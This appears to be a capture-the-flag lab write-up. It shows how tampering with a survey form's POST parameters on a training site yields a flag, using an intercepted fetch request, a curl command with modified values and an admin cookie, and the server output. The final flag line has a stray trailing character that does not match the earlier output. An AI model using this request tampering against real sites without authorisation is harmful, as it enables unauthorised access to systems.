# Parameter pollution
- a technique where attackers manipulate HTTP parameters to alter the behavior of a web application in unintended ways
- this manipulation is achieved by adding, modifying, or duplicating POST data
- https://book.hacktricks.xyz/pentesting-web/parameter-pollution

<b>keywords</b>: survey<br>
<b>attacked site</b>: http://borntosec.42/?page=survey#

## Exploit
Upon examining the network traffic for the survey website and sending a sample request, we intercept a fetch request:
``` http
FETCH:
await fetch("http://borntosec.42/?page=survey#", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1"
    },
    "referrer": "http://borntosec.42/?page=survey",
    "body": "sujet=5&valeur=2",
    "method": "POST",
    "mode": "cors"
});
```
We observe that two parameters, <code>sujet</code> and <code>valeur</code>, are sent to the server. This means we can manipulate the POST data:
```
sujet=$number1&valeur=$number2
```
By sending a modified request with <code>cURL</code> and filtering for the flag, after multiple tries we find that setting both parameters to 42 yields a successful result:
``` shell
└─$ curl 'http://borntosec.42/?page=survey#' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://borntosec.42' -H 'Connection: keep-alive' -H 'Referer: http://borntosec.42/?page=survey' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'sujet=42&valeur=42' | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
1<center><h2 style="margin-top:50px;"> The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <div style="margin-top:-75px">
00  1498    0  1480  100    18   470k   5855 --:--:-- --:--:-- --:--:--  731k
```
The flag is included in the response:
```
The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
```

## Flag
03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaaq
